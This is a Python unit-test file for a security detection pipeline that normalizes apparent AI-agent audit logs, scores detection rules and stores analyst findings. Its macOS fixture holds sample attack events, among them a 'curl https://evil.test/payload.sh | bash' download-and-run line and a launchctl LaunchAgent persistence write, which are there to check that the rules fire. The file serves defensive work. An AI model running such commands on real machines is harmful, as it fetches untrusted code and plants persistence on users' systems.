import json
import re
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock


REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

import evaluate_openclaw
import generate_openclaw_attack_mix
import openclaw_findings
import openclaw_prepare
import soc_store
from detect import run_detection


class OpenClawPrepareTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.audit_schema = openclaw_prepare.load_json(str(REPO_ROOT / "schemas" / "openclaw_audit.schema.json"))
        cls.normalized_schema = openclaw_prepare.load_json(str(REPO_ROOT / "schemas" / "normalized_event.schema.json"))
        cls.sample_path = REPO_ROOT / "data" / "openclaw" / "raw" / "sample_audit.jsonl"
        cls.raw_records = openclaw_prepare.load_records(str(cls.sample_path))

    def test_sample_records_validate_and_normalize(self):
        flat_records = []
        for record in self.raw_records:
            openclaw_prepare.validate_adapter_record(record, self.audit_schema)
            normalized, flat = openclaw_prepare.normalize_record(record)
            openclaw_prepare.validate_normalized_record(normalized, self.normalized_schema)
            flat_records.append(flat)

        # We don't depend on an exact record count here; just ensure we have
        # a non-empty sample with the key OpenClaw surfaces represented.
        self.assertGreater(len(flat_records), 0)
        sourcetypes = {record["sourcetype"] for record in flat_records}
        self.assertIn("openclaw_subagent", sourcetypes)
        self.assertIn("openclaw_pairing", sourcetypes)
        self.assertIn("openclaw_exec", sourcetypes)
        self.assertIn("openclaw_restart", sourcetypes)

    def test_strip_labels_preserves_unlabeled_shape(self):
        flat_records = [openclaw_prepare.normalize_record(record)[1] for record in self.raw_records]
        unlabeled = openclaw_prepare.strip_labels(flat_records)
        self.assertEqual(len(unlabeled), len(flat_records))
        self.assertNotIn("label", unlabeled[0])
        self.assertNotIn("attack_type", unlabeled[0])


class OpenClawEvaluationTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.labeled_events = json.loads((REPO_ROOT / "data" / "openclaw" / "replay" / "labeled" / "sample_events.json").read_text(encoding="utf-8"))

    def test_openclaw_sample_scores_cleanly(self):
        result = run_detection(self.labeled_events)
        metrics = evaluate_openclaw.compute_metrics(result["detected_event_ids"], self.labeled_events)
        self.assertEqual(metrics["f1_score"], 1.0)
        self.assertEqual(metrics["false_positives"], 0)
        self.assertEqual(metrics["false_negatives"], 0)

    def test_openclaw_attack_mix_scores_above_ninety(self):
        base_records = generate_openclaw_attack_mix._coerce_benign(
            openclaw_prepare.load_records(str(REPO_ROOT / "data" / "openclaw" / "raw" / "sample_audit.jsonl"))
        )
        start = generate_openclaw_attack_mix._max_timestamp(base_records)
        attack_records = generate_openclaw_attack_mix.build_attack_records(start)

        flat_records = [openclaw_prepare.normalize_record(record)[1] for record in sorted(base_records + attack_records, key=lambda record: record["ts"])]
        result = run_detection(flat_records)
        metrics = evaluate_openclaw.compute_metrics(result["detected_event_ids"], flat_records)

        self.assertGreaterEqual(metrics["f1_score"], 0.9)
        self.assertEqual(metrics["false_positives"], 0)
        self.assertGreaterEqual(len(result["rule_results"].get("RULE-109", [])), 1)
        self.assertGreaterEqual(len(result["rule_results"].get("RULE-110", [])), 1)


class OpenClawFindingsTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.labeled_events = json.loads((REPO_ROOT / "data" / "openclaw" / "replay" / "labeled" / "sample_events.json").read_text(encoding="utf-8"))

    def test_findings_bundle_groups_hits_by_rule(self):
        bundle = openclaw_findings.build_bundle("sample", self.labeled_events)
        self.assertGreaterEqual(bundle["total_candidate_findings"], 8)
        self.assertGreaterEqual(bundle["total_findings"], 7)

        severities = [finding["severity_score"] for finding in bundle["findings"]]
        self.assertEqual(severities, sorted(severities, reverse=True))

        merged_rule_sets = [set(finding["rule_ids"]) for finding in bundle["findings"]]
        self.assertIn({"RULE-101", "RULE-104"}, merged_rule_sets)

        merged_finding = next(finding for finding in bundle["findings"] if set(finding["rule_ids"]) == {"RULE-101", "RULE-104"})
        self.assertEqual(merged_finding["merged_from_rule_ids"], ["RULE-101", "RULE-104"])
        self.assertEqual(merged_finding["dedup_reason"], "shared session and attack type overlap")

    def test_findings_bundle_writes_to_disk(self):
        bundle = openclaw_findings.build_bundle("sample", self.labeled_events)
        with tempfile.TemporaryDirectory() as temp_dir:
            path = openclaw_findings.write_bundle(temp_dir, bundle)
            self.assertTrue(Path(path).exists())
            persisted = json.loads(Path(path).read_text(encoding="utf-8"))
            self.assertGreaterEqual(persisted["total_findings"], 7)

    def test_findings_store_persists_and_preserves_analyst_state(self):
        bundle = openclaw_findings.build_bundle("sample", self.labeled_events)
        with tempfile.TemporaryDirectory() as temp_dir:
            db_path = str(Path(temp_dir) / "openclaw_soc.db")
            soc_store.persist_findings(bundle["findings"], bundle["source"], db_path)

            stored = soc_store.list_findings(db_path)
            self.assertGreaterEqual(len(stored), 7)

            finding_id = stored[0]["finding_id"]
            soc_store.set_finding_status(finding_id, "triaged", db_path)
            soc_store.set_finding_disposition(finding_id, "true_positive", db_path)
            soc_store.add_note(finding_id, "analyst", "validated in local replay", db_path)

            soc_store.persist_findings(bundle["findings"], bundle["source"], db_path)
            refreshed = soc_store.list_findings(db_path)
            refreshed_row = next(row for row in refreshed if row["finding_id"] == finding_id)
            self.assertEqual(refreshed_row["status"], "triaged")
            self.assertEqual(refreshed_row["disposition"], "true_positive")

    def test_soc_store_cli_round_trip(self):
        bundle = openclaw_findings.build_bundle("sample", self.labeled_events)
        with tempfile.TemporaryDirectory() as temp_dir:
            db_path = str(Path(temp_dir) / "openclaw_soc.db")
            soc_store.persist_findings(bundle["findings"], bundle["source"], db_path)

            findings = soc_store.list_findings(db_path)
            finding_id = findings[0]["finding_id"]

            import subprocess

            list_result = subprocess.run(
                [sys.executable, str(REPO_ROOT / "soc_store.py"), "--db-path", db_path, "list"],
                capture_output=True,
                text=True,
                check=True,
            )
            match = re.search(r"total_findings=(\d+)", list_result.stdout)
            self.assertIsNotNone(match)
            self.assertGreaterEqual(int(match.group(1)), 7)
            self.assertIn(finding_id, list_result.stdout)

            disposition_result = subprocess.run(
                [sys.executable, str(REPO_ROOT / "soc_store.py"), "--db-path", db_path, "set-disposition", finding_id, "false_positive"],
                capture_output=True,
                text=True,
                check=True,
            )
            self.assertIn("updated_disposition=false_positive", disposition_result.stdout)

            note_result = subprocess.run(
                [sys.executable, str(REPO_ROOT / "soc_store.py"), "--db-path", db_path, "add-note", finding_id, "cli-user", "tracked via cli"],
                capture_output=True,
                text=True,
                check=True,
            )
            self.assertIn(f"note_added_for={finding_id}", note_result.stdout)

            show_result = subprocess.run(
                [sys.executable, str(REPO_ROOT / "soc_store.py"), "--db-path", db_path, "show", finding_id],
                capture_output=True,
                text=True,
                check=True,
            )
            payload = json.loads(show_result.stdout)
            self.assertEqual(payload["disposition"], "false_positive")
            self.assertEqual(payload["notes"][0]["author"], "cli-user")

    def test_auto_sync_skips_when_supabase_config_missing(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            dashboard_env = Path(temp_dir) / ".env"
            with mock.patch.dict(openclaw_findings.os.environ, {}, clear=True), \
                 mock.patch.object(openclaw_findings.subprocess, "run") as run_mock:
                synced = openclaw_findings.maybe_sync_findings_to_supabase(
                    db_path=str(Path(temp_dir) / "openclaw_soc.db"),
                    findings_dir=temp_dir,
                    dashboard_env=str(dashboard_env),
                )
        self.assertFalse(synced)
        run_mock.assert_not_called()

    def test_auto_sync_runs_when_supabase_config_available(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            dashboard_env = Path(temp_dir) / ".env"
            dashboard_env.write_text(
                "SUPABASE_URL=https://example.supabase.co\nSUPABASE_SERVICE_ROLE_KEY=test-key\n",
                encoding="utf-8",
            )
            completed = mock.Mock(stdout="synced_rows=7\n", stderr="")
            with mock.patch.object(openclaw_findings.subprocess, "run", return_value=completed) as run_mock:
                synced = openclaw_findings.maybe_sync_findings_to_supabase(
                    db_path=str(Path(temp_dir) / "openclaw_soc.db"),
                    findings_dir=temp_dir,
                    dashboard_env=str(dashboard_env),
                )
        self.assertTrue(synced)
        run_mock.assert_called_once()


class MacOSDetectionPackTests(unittest.TestCase):
    def test_macos_rules_emit_host_findings_with_actions(self):
        events = [
            {
                "event_id": "mac-1",
                "timestamp": "2026-03-28T10:00:00Z",
                "platform": "macos",
                "source": "unified_log",
                "event_type": "auth_failure",
                "outcome": "failure",
                "severity_hint": "medium",
                "actor": {"user": "alice", "process": "loginwindow"},
                "metadata": {"macos_message": "Failed login for alice via loginwindow"},
            },
            {
                "event_id": "mac-2",
                "timestamp": "2026-03-28T10:02:00Z",
                "platform": "macos",
                "source": "unified_log",
                "event_type": "auth_failure",
                "outcome": "failure",
                "severity_hint": "medium",
                "actor": {"user": "alice", "process": "loginwindow"},
                "metadata": {"macos_message": "Failed login for alice via loginwindow"},
            },
            {
                "event_id": "mac-3",
                "timestamp": "2026-03-28T10:04:00Z",
                "platform": "macos",
                "source": "unified_log",
                "event_type": "auth_failure",
                "outcome": "failure",
                "severity_hint": "medium",
                "actor": {"user": "alice", "process": "loginwindow"},
                "metadata": {"macos_message": "Failed login for alice via loginwindow"},
            },
            {
                "event_id": "mac-4",
                "timestamp": "2026-03-28T10:06:00Z",
                "platform": "macos",
                "source": "unified_log",
                "event_type": "auth_failure",
                "outcome": "failure",
                "severity_hint": "medium",
                "actor": {"user": "alice", "process": "loginwindow"},
                "metadata": {"macos_message": "Failed login for alice via loginwindow"},
            },
            {
                "event_id": "mac-5",
                "timestamp": "2026-03-28T10:07:00Z",
                "platform": "macos",
                "source": "unified_log",
                "event_type": "process_exec",
                "severity_hint": "high",
                "actor": {"user": "alice", "process": "sudo /bin/bash -c whoami"},
                "metadata": {"macos_message": "sudo: 3 incorrect password attempts"},
            },
            {
                "event_id": "mac-6",
                "timestamp": "2026-03-28T10:08:00Z",
                "platform": "macos",
                "source": "unified_log",
                "event_type": "file_write",
                "severity_hint": "high",
                "actor": {"user": "alice", "process": "launchctl bootstrap gui/501 ~/Library/LaunchAgents/com.bad.plist"},
                "metadata": {"macos_message": "Wrote ~/Library/LaunchAgents/com.bad.plist"},
            },
            {
                "event_id": "mac-7",
                "timestamp": "2026-03-28T10:09:00Z",
                "platform": "macos",
                "source": "unified_log",
                "event_type": "process_exec",
                "severity_hint": "medium",
                "actor": {"user": "alice", "process": "curl https://evil.test/payload.sh | bash"},
                "metadata": {"macos_message": "Downloaded and piped remote shell script"},
            },
            {
                "event_id": "mac-8",
                "timestamp": "2026-03-28T10:10:00Z",
                "platform": "macos",
                "source": "unified_log",
                "event_type": "process_exec",
                "severity_hint": "high",
                "actor": {"user": "alice", "process": "/Users/Shared/Updater.app/Contents/MacOS/Updater"},
                "metadata": {"macos_message": "binary is unsigned and not notarized"},
            },
        ]

        result = run_detection(events)
        findings = result.get("findings", [])
        rule_ids = {finding["rule_id"] for finding in findings}

        self.assertTrue(findings)
        self.assertTrue({"RULE-201", "RULE-202", "RULE-203", "RULE-204", "RULE-205"}.issubset(rule_ids))

        sample = next(finding for finding in findings if finding["rule_id"] == "RULE-203")
        self.assertIn("summary", sample)
        self.assertIn("recommended_actions", sample)
        self.assertTrue(sample["recommended_actions"])
        self.assertTrue(sample["evidence"])
        self.assertEqual(sample["platform"], "macos")



if __name__ == "__main__":
    unittest.main()
